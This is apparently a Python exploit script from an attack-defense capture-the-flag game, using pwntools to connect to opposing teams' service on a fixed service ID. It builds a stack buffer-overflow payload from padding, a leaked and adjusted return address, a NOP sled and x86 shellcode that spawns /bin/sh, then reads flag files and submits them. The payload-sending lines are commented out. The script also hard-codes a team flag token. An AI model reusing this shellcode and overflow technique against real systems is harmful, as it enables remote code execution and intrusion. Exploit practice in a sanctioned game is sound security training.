#!/usr/bin/env python

import swpag_client
import pwn

URL = "52.37.204.0"
TEAM_URL = "http://" + URL + "/"
TEAM_FLAG_TOKEN = "nt4yw7LjoPFc2WE49cLG"
SERVICE_ID = 4 # Update for each exploit to target the correct service

def main():
  team = swpag_client.Team(TEAM_URL, TEAM_FLAG_TOKEN)
  allflags = []

  for target in team.get_targets(SERVICE_ID):
    flag_id = target["flag_id"]
    hostname = target["hostname"]
    port = target["port"]

  #flag_id = '2658873307'
  #hostname = 'localhost'
  #port = 10004

    print("Running exploit on {0}:{1} -> {2}".format(hostname, port, flag_id))

    flag_obtained = None
    
    try:
      process = pwn.remote(hostname, int(port), timeout=3)
      process.readuntil('id ')
      execution_id = process.readuntil(')')
      execution_id = int(execution_id[0:10]) 
      execution_id = execution_id - 48
      big_endian = pwn.p32(execution_id)

      process.readuntil('?') 
      process.write('W\n') 
      process.readuntil('Whitespace!\n')
      process.write('1 1 1\n')
      #shellcode = b'\x31\x20\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61' + big_endian + b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x4b\x2c\x40\xcd\x80\x0a'

      #print(shellcode)
      
      #process.write(shellcode)
      #process.interactive()
      #process.readuntil('$')
      #process.wait(0.5)
      #process.send('cat '+flag_id+'\n')
      #process.wait(0.5)
      #flag = (process.recvall(timeout=2))
      #print(flag)
      #allflags.append(flag.decode('ascii')[-16:-1])


      #print(process.readuntil('password!'))
      #process.send('\n')
      #process.send('\n')
      #print('cat ' + target['flag_id']) 
      #print(process.send("cat " + target["flag_id"] + "\n"))
      #flags = process.recvall(timeout=2).strip("\r\n")
      #print(flags)
      #print(team.submit_flag([flag]))
      process.close()
  
    except Exception as e:
      process.close()
  
  print(allflags)
  print(team.submit_flag(allflags))

if __name__ == "__main__":
  main()
